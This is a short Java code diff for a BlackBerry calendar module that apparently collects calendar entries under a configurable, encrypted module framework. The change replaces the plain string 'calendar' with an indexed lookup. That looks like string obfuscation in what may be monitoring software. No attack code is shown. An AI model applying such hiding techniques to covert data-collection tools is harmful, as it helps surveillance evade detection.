@@ -14,6 +14,7 @@ import net.rim.blackberry.api.pdap.BlackBerryEvent;
 import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
@@ -44,7 +45,7 @@ public class ModuleCalendar extends BaseModule implements PIMListListener {
     protected static final int PERIODTIME = 60 * 60 * 1000;
 
     public static String getStaticType() {
-        return "calendar";
+        return Messages.getString("19.0"); //"calendar";
     }
 
     public boolean parse(ConfModule conf) {
